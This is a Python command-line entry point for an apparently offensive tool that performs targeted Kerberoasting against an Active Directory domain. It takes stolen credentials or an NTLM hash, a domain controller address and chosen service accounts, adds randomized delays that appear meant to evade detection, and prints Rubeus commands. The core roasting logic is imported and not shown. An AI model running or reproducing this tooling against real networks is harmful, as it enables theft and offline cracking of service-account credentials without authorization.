#!/usr/bin/env python3
"""
CLI Entry Point — Targeted Kerberoasting

Usage:
    python -m targeted_kerberoast -d corp.local -u jdoe -p 'Pass' --dc 10.10.10.1 -t svc_sql svc_backup
    python -m targeted_kerberoast -d corp.local -u jdoe -H ntlmhash --dc 10.10.10.1 -t svc_sql
"""

import argparse

from .core.roaster import TargetedKerberoast


def main():
    parser = argparse.ArgumentParser(description="Targeted Kerberoasting")
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--username", required=True)
    parser.add_argument("-p", "--password", default="")
    parser.add_argument("-H", "--hash", default="")
    parser.add_argument("--dc", required=True)
    parser.add_argument(
        "-t", "--targets", nargs="+", required=True,
        help="Target usernames to Kerberoast",
    )
    parser.add_argument("--min-delay", type=float, default=2.0)
    parser.add_argument("--max-delay", type=float, default=10.0)

    args = parser.parse_args()

    tk = TargetedKerberoast(
        domain=args.domain,
        username=args.username,
        password=args.password,
        dc_ip=args.dc,
        ntlm_hash=args.hash,
    )

    tk.roast_priority_targets(args.targets, (args.min_delay, args.max_delay))
    tk.print_rubeus_commands(args.targets)


if __name__ == "__main__":
    main()